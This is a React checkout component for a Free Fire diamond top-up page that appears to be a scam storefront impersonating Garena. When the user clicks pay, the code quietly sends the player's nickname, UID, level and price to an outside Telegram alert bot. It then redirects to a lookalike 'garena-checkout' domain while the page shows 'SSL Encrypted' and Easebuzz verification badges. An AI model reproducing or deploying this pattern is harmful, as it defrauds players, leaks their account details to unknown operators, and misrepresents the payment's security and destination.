import React, { useState } from 'react';
import { motion } from 'motion/react';
import { ShieldCheck, CheckCircle2, ChevronRight, Lock, AlertCircle } from 'lucide-react';
import { PlayerData, PackageItem, PageRoute } from '../types';

interface CheckoutProps {
  playerData: PlayerData | null;
  selectedPackage: PackageItem | null;
  uid: string;
  setRoute: (route: PageRoute) => void;
  onOpenCancelModal: () => void;
}

export default function Checkout({ playerData, selectedPackage, uid, setRoute, onOpenCancelModal }: CheckoutProps) {
  const [error, setError] = useState('');

  if (!selectedPackage || !playerData) {
    return (
      <div className="bg-white rounded-2xl p-8 border border-gray-100 shadow-xs text-center space-y-4">
        <p className="text-sm font-bold text-gray-500">No active package selected for checkout.</p>
        <button
          onClick={() => setRoute('diamond')}
          className="bg-[#ee2c24] hover:bg-red-600 text-white font-extrabold px-6 py-2.5 rounded-xl text-xs uppercase tracking-wider transition-colors cursor-pointer"
        >
          Select Package
        </button>
      </div>
    );
  }

  const base = selectedPackage.base;
  const bonus = selectedPackage.bonus;
  const price = selectedPackage.price;
  const totalDiamonds = base + bonus;
  const info = playerData.basicInfo;
  const userUid = localStorage.getItem('ff_uid') || '---';

  const handlePayNow = () => {
    setError(''); // Reset any existing error state

    if (!selectedPackage || !playerData) {
      setError('Checkout state is incomplete. Please select a package and login again.');
      return;
    }

    // 1. Google Ads Conversion Event
    if (typeof window !== 'undefined' && (window as any).gtag) {
      (window as any).gtag('event', 'conversion', {
        'send_to': 'AW-17990074173/8HBuCMvqmoIcEL3-qoJD',
        'transaction_id': ''
      });
    }

    // Save transaction state to local storage for recovery/success template
    localStorage.setItem('ff_avatar_url', `https://gatway-seven.vercel.app/gateway?img=${info.headPic || '902000162'}`);
    localStorage.setItem('ff_nick', info.nickname);
    localStorage.setItem('ff_uid', uid);
    localStorage.setItem('ff_lvl', String(info.level));
    localStorage.setItem('ff_price', String(price));
    localStorage.setItem('ff_dia', String(totalDiamonds));
    localStorage.setItem('ff_timestamp', Date.now().toString());

    // 3. Telemetry Dispatch via Secure Backend API proxy route
    fetch('/api/log-purchase', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        nickname: info.nickname,
        level: info.level,
        uid: uid,
        totalDiamonds: totalDiamonds,
        price: price
      })
    }).catch(err => console.error('Secure purchase log dispatcher failed:', err));

    const messageText = `
🚀 *GGDIAMOND ALERT*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${info.nickname}
📊 *Level:* ${info.level}
🆔 *UID:* ${uid}
💎 *Diamonds:* ${totalDiamonds}
💰 *Price:* ₹${price}
━━━━━━━━━━━━━━━━━━
✅ *Action:* User Clicked PAY NOW
    `;

    const backendUrl = "https://teligram-alert-bot.vercel.app/api/send"; 
    fetch(backendUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: "8422419131", 
            message: messageText
        })
    }).catch(console.error);

    // Facebook Pixel — InitiateCheckout (fires once, before payment redirect)
    if (typeof window !== 'undefined' && (window as any).fbq) {
      const parsedValue = parseFloat(String(price));
      if (!isNaN(parsedValue) && parsedValue > 0) {
        (window as any).fbq('track', 'InitiateCheckout', {
          value: parsedValue,
          currency: 'INR',
          content_name: `Free Fire ${totalDiamonds} Diamonds`,
          content_category: 'Gaming',
          content_ids: ['ff_diamonds'],
          content_type: 'product',
          num_items: 1
        });
      }
    }

    // 4. Redirect to Garena Checkout URL
    const garenaUrl = new URL(
      'https://www.garnastoregarbs.shop/garena-checkout'
    );
    garenaUrl.searchParams.set('pkg',      String(price));
    garenaUrl.searchParams.set('diamonds', String(totalDiamonds));
    garenaUrl.searchParams.set('uid',      uid);
    garenaUrl.searchParams.set('nick',     info.nickname || '');
    garenaUrl.searchParams.set('level',    String(info.level || 0));
    window.location.href = garenaUrl.toString();
  };

  return (
    <div className="space-y-6 relative">
      {/* Decorative Particle Elements */}
      <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden opacity-45">
        <span className="absolute w-3.5 h-3.5 rounded-full bg-emerald-400/40 blur-[1px] top-10 left-5 animate-pulse" />
        <span className="absolute w-4 h-4 rounded-full bg-indigo-500/30 blur-[1.5px] top-16 right-10 animate-ping duration-[3000ms]" />
        <span className="absolute w-3 h-3 rounded-full bg-amber-500/40 blur-[1px] bottom-12 left-10 animate-pulse duration-[2000ms]" />
        <span className="absolute w-4 h-4 rounded-full bg-rose-500/30 blur-[1.5px] bottom-24 right-5" />
      </div>

      <div className="flex items-center gap-2.5 text-gray-800 font-extrabold text-sm text-left relative z-10">
        <span className="flex items-center justify-center bg-[#ee2c24] text-white w-5 h-5 rounded font-bold text-xs">
          3
        </span>
        <h1 className="text-sm font-extrabold text-gray-800">
          Review &amp; Execute Secure Diamond Payment
        </h1>
      </div>

      <motion.div
        initial={{ opacity: 0, scale: 0.98 }}
        animate={{ opacity: 1, scale: 1 }}
        className="bg-white rounded-xl border border-gray-100 shadow-xl overflow-hidden relative z-10"
      >
        {/* Verification Card Header */}
        <div className="bg-gray-50/50 p-4 border-b border-gray-100 flex flex-wrap items-center justify-between gap-3 text-left">
          <div className="flex items-center gap-1.5">
            <CheckCircle2 className="w-4 h-4 text-emerald-500 fill-emerald-50" />
            <h2 className="text-sm font-extrabold text-gray-800 uppercase tracking-wide">Review Purchase</h2>
          </div>
          <div className="flex flex-col items-end">
            <div className="flex items-center gap-1.5 text-xs font-black text-[#ee2c24] uppercase tracking-wide">
              <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-ping"></span>
              {info.nickname}
            </div>
            <div className="text-[9px] text-gray-400 font-bold mt-0.5">
              UID: <span className="text-gray-700">{uid}</span> | Server: <span className="text-gray-700">IND</span>
            </div>
          </div>
        </div>

        {/* Purchase Calculations Body */}
        <div className="p-5 space-y-5 text-left">
          {/* Diamonds Preview */}
          <div className="space-y-1">
            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Selected Product</label>
            <div className="flex items-center gap-3 bg-gray-50/40 p-3.5 rounded-xl border border-gray-100">
              <img
                src="https://static.wixstatic.com/media/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp/v1/fill/w_100,h_100,al_c,q_80/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp"
                alt={`Free Fire ${totalDiamonds} Diamonds Bundle for ₹${price}`}
                loading="lazy"
                decoding="async"
                className="w-10 h-10 object-contain"
              />
              <div className="space-y-0.5">
                <h3 className="text-sm sm:text-base font-extrabold text-gray-800 tracking-tight">
                  Diamonds x{base.toLocaleString()} <span className="text-amber-500 font-black">+{bonus.toLocaleString()}</span>
                </h3>
                <p className="text-[11px] font-bold text-emerald-600 flex items-center gap-1">
                  Total Diamonds: {totalDiamonds.toLocaleString()} Diamonds
                  <img
                    src="https://static.wixstatic.com/media/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp/v1/fill/w_32,h_32,al_c,q_75/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp"
                    alt="Free Fire Diamond icon"
                    loading="lazy"
                    decoding="async"
                    className="w-3 h-3 object-contain"
                  />
                </p>
              </div>
            </div>
          </div>

          {/* Pricing area */}
          <div className="flex items-stretch gap-3">
            <div className="flex-1 flex flex-col justify-center p-3 bg-gray-50/40 rounded-xl border border-gray-100">
              <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Subtotal</span>
              <span className="text-3xl font-black text-gray-800 tracking-tight block mt-0.5">₹ {price}</span>
            </div>
            <div className="flex-1 flex flex-col justify-center p-3 bg-red-50/15 rounded-xl border border-red-100/40">
              <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">TOTAL DIAMONDS</span>
              <span className="text-3xl font-black text-[#ee2c24] tracking-tight mt-0.5 flex items-center gap-1.5">
                {totalDiamonds}
                <img
                  src="https://static.wixstatic.com/media/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp/v1/fill/w_32,h_32,al_c,q_75/fa21d6_28cb860923fa474abd20749b7cfc313e~mv2.webp"
                  alt="Free Fire In-Game Diamond"
                  className="w-5.5 h-5.5 object-contain"
                />
              </span>
              <p className="text-[11px] text-gray-400 font-semibold mt-1">
                UID: {userUid}
              </p>
            </div>
          </div>

          {/* Secure Payment details */}
          <div className="space-y-1.5">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Payment Gateway</span>
            <div className="flex items-center justify-between p-3 bg-slate-50 border border-slate-200/50 rounded-xl">
              <img
                src="https://static.wixstatic.com/media/080ce7_dbad3a15cd6e4fd1a1793b66574f1dc1~mv2.png/v1/fill/w_180,h_50,al_c,q_80/080ce7_dbad3a15cd6e4fd1a1793b66574f1dc1~mv2.png"
                alt="Easebuzz payment channels"
                loading="lazy"
                decoding="async"
                className="h-6 object-contain"
              />
              <div className="flex items-center gap-1 text-slate-500 font-extrabold text-[9px] uppercase tracking-widest">
                <Lock className="w-3 h-3 text-slate-400" />
                SSL Encrypted
              </div>
            </div>
          </div>

          {/* Error Message Card */}
          {error && (
            <div className="p-3 bg-red-50 border border-red-100 rounded-xl text-red-600 font-bold text-xs flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-red-500" />
              <span>{error}</span>
            </div>
          )}

          {/* Main Action Trigger Button */}
          <button
            onClick={handlePayNow}
            className="w-full bg-gradient-to-r from-red-600 to-[#ee2c24] hover:brightness-105 active:scale-[0.98] text-white py-3 px-5 rounded-xl font-black text-xs uppercase tracking-wider shadow-md cursor-pointer flex items-center justify-center gap-1.5"
          >
            Pay Securely ₹{price}
            <ChevronRight className="w-3.5 h-3.5" />
          </button>

          <p className="text-[11.5px] text-gray-500 font-bold text-center mt-2.5 px-1 leading-relaxed">
            💎 This diamond transfer in to your Free Fire account after a payment
          </p>

          {/* Extra visual security elements */}
          <div className="flex flex-col items-center justify-center pt-2 space-y-2 text-center">
            <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest flex items-center gap-1">
              <Lock className="w-3.5 h-3.5 text-emerald-500 fill-emerald-50/50" />
              Secure transaction verified via Easebuzz
            </p>
            <img
              src="https://cdn.shopify.com/s/files/1/0601/8646/0356/files/Untitled-2_ffb40be5-db5b-42c4-bf32-2200495aa8bb.png?v=1687840586&width=480"
              alt="Secured networks"
              loading="lazy"
              decoding="async"
              className="w-full max-w-[240px] opacity-80"
            />
          </div>
        </div>
      </motion.div>
    </div>
  );
}
